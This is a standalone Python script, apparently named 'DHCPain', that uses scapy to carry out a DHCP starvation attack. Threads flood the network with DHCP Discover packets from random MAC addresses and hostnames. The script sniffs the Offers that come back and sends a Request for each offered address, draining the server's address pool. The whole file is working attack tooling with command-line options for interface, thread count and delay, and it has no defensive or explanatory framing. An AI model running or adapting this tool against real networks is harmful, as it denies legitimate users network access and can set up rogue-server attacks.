#!/usr/bin/env python3
# from collections import queue
from argparse import ArgumentParser
from colorama import init, Fore, Style
from queue import Queue, Empty
from scapy import volatile
from scapy.all import *
from threading import Thread, Event
import binascii
import os
import string
import time

init()

class C:
    BRT = Style.BRIGHT
    DIM = Style.DIM
    RST = Style.RESET_ALL

    RED = Fore.RED
    BLU = Fore.BLUE
    CYN = Fore.CYAN
    GRN = Fore.GREEN
    MGT = Fore.MAGENTA
    YLW = Fore.YELLOW

    PFX = RST + BRT + CYN + "[DHCPain]" + RST
    MSG_DSC = RST + BRT + MGT + "DHCP Discover" + RST
    MSG_OFF = RST + BRT + YLW + "DHCP Offer" + RST
    MSG_REQ = RST + BRT + MGT + "DHCP Request" + RST
    MSG_ACK = RST + BRT + GRN + "DHCP Acknowledge" + RST

def ran_str(size, charset=string.ascii_uppercase + string.ascii_lowercase + string.digits):
    """Return a random string of length `size` randomly chosen from `charset`"""
    f = (lambda x: random.sample(x, 1)[0]) if isinstance(charset, set) \
        else (random.choice)
    return ''.join(f(charset) for _ in range(size))


def mac_val(raw):
    assert isinstance(raw, bytes) and len(raw) >= 6
    val = binascii.hexlify(raw).decode()[0:12]
    return ':'.join(val[i:i+2] for i in range(0,12,2))

def ran_mac():
    """Return a random MAC address formatted with colons"""
    return mac_val(os.urandom(6))


def ran_mac_raw():
    """Return mac address in raw string and raw format"""
    m = ran_mac()
    return m, mac2str(m)

def get_iface(iface):
    return IFACES.dev_from_name(iface) if WINDOWS else iface

_evt = Event()
def get_stop_event():
    return _evt


class Handler(Thread):
    """
    This thread will sniff DHCP packets and handle all scheduling,
    logging, and packet processing
    """
    def __init__(self, iface, rq):
        super().__init__()
        assert isinstance(rq, Queue), "Please provide a Queue for `rq`"
        self._rq = rq
        self.daemon = True
        self._iface = get_iface(iface)
        self._mac = get_if_hwaddr(self._iface)
        self._stop = get_stop_event()

    def run(self):
        sniff(filter="udp and port 67 and port 68", iface=self._iface, prn=self._handle)

    def _handle(self, pkt):
        me = pkt[Ether].src == self._mac
        arrow = "->" if me else "<-"
        dmsg = ("SENT" if me else "RCVD") + " " #  + " {} ".format(arrow)

        # Only really interested in DHCP/BOOTP packets
        if DHCP in pkt and BOOTP in pkt:
            # Get the value of the DHCP message type
            t = next(opt[1] for opt in pkt[DHCP].options if isinstance(opt, tuple) and opt[0].lower() == "message-type")
            assert t in DHCPTypes
            n = DHCPTypes[t]
            extra = []

            if n == "discover":
                tmsg = C.MSG_DSC
            elif n == "offer":
                tmsg = C.MSG_OFF
                extra.append("Server " + pkt[BOOTP].siaddr)
                rq.put(pkt)  # place offer packet on Request Queue
            elif n == "request":
                tmsg = C.MSG_REQ
            elif n == "ack":
                extra.append("Lease: " + pkt[BOOTP].yiaddr)
                tmsg = C.MSG_ACK
            else:
                return

            l, r = (pkt[Ether].src, pkt[Ether].dst)
            if not me:
                l, r = r, l

            print(C.PFX, "{} {:<35}".format(dmsg, tmsg), l, arrow, r, *extra)


class Requester(Thread):
    """
    This thread will craft DHCP Request messages from the
    provided queue and will ultimately
    """
    def __init__(self, iface, rq):
        super().__init__()
        self.daemon = True
        self._rq = rq
        self._stop = get_stop_event()
        self._iface = get_iface(iface)
        self._mac = get_if_hwaddr(self._iface)

    def run(self):
        while not self._stop.is_set():
            try:
                pkt_offer = self._rq.get(timeout=0.25)
            except Empty:
                continue
            sendp(
                Ether(src=self._mac, dst="ff:ff:ff:ff:ff:ff") / \
                IP(src="0.0.0.0", dst="255.255.255.255") / \
                UDP(sport=68, dport=67) / \
                BOOTP(chaddr=[pkt_offer[BOOTP].chaddr], xid=pkt_offer[BOOTP].xid, flags=0xffffff) / \
                DHCP(options = [
                    ("message-type", 3),
                    ("server_id", pkt_offer[BOOTP].siaddr),
                    ("requested_addr", pkt_offer[BOOTP].yiaddr),
                    ("hostname", ran_str(10)),
                    ("param_req_list", []),
                ]),
                iface=self._iface,
                verbose=False,
            )


class Discover(Thread):
    """
    This thread simply sends out DHCP Discover packets with
    randomly generated BOOTP Hardware Address identifier and
    Hostname values to trigger a DHCP Offer response
    """
    def __init__(self, iface="eth0", delay=1.0):
        super().__init__()
        self.daemon = True
        self._stop = get_stop_event()
        self._delay = delay
        self._iface = get_iface(iface)
        self._mac = get_if_hwaddr(self._iface)

    def run(self):
        while not self._stop.is_set():
            _, mac_raw = ran_mac_raw()
            sendp(
                Ether(src=self._mac, dst="ff:ff:ff:ff:ff:ff") / \
                IP(src="0.0.0.0", dst="255.255.255.255") / \
                UDP(sport=68, dport=67) / \
                BOOTP(chaddr=mac_raw) / \
                DHCP(options = [
                    ("message-type", 1),
                    ("param_req_list", [1, 121, 3, 6, 16, 119, 252, 95, 44, 46]),
                    ("max_dhcp_size",1499),
                    ("client_id", 1, mac_raw),
                    ("lease_time",10000),
                    ("hostname", ran_str(10)),
                    ("end",'00000000000000')
                ]),
                iface=self._iface,
                verbose=False,
            )
            time.sleep(self._delay)

def main():
    ap = ArgumentParser()
    ap.add_argument("--iface", "-i", type=str, required=True, help="Interface name")
    ap.add_argument("--threads", "-t", type=int, default=1, help="Number of concurrent threads")
    ap.add_argument("--delay", "-d", type=float, default=1.0, help="Number of concurrent threads")
    args = ap.parse_args()

    rq = Queue()
    Handler(args.iface, rq).start()
    Requester(args.iface, rq).start()
    for _ in range(args.threads):
        Discover(args.iface, delay=args.delay).start()
    get_stop_event().wait()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        get_stop_event().set()
        print("\n" + C.PFX, C.BRT + C.RED + "Exiting..." + C.RST)
    except Exception as e:
        print(e)
    finally:
        exit(0)
